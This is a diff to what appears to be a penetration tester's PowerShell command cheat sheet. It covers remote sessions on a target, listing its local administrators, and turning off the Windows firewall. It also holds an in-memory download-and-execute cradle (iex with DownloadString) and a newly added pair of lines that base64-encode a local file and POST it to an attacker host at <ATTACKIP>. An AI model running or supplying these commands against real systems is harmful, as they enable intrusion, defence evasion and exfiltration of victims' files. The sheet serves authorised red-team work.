@@ -23,7 +23,6 @@ $session = New-PSSession -ComputerName <target> -Credential $creds
 # PSSESSION
 echo '$cred = Get-Credential'
 echo 'Enter-PSSession -ComputerName <TARGET> -Authentication Negotiate -Credential $cred'
-echo '
 
 # Invoke-Command on remote computer via PS Remoting Session
 Invoke-Command -ScriptBlock{hostname;whoami;Get-LocalGroupMember -Group Administrators} -Session <session>
@@ -44,4 +43,8 @@ Invoke-Sqlcmd -Query '<query>' -Username <user> -Password <pass>
 Set-NetFirewallProfile -Name Domain,Private,Public -Enabled False
 
 # Download in Memory
-echo 'iex (New-Object Net.WebClient).DownloadString(\'<URL>\')
+echo 'iex (New-Object Net.WebClient).DownloadString(\'<URL>\')'
+
+# Convert file to base64 and upload it to attack machine webserver listening with netcat
+echo '$Base64String = [System.convert]::ToBase64String((Get-Content -Path "c:/<PATH>" -Encoding Byte))'
+echo 'Invoke-WebRequest -Uri http://<ATTACKIP> -Method POST -Body $Base64String'
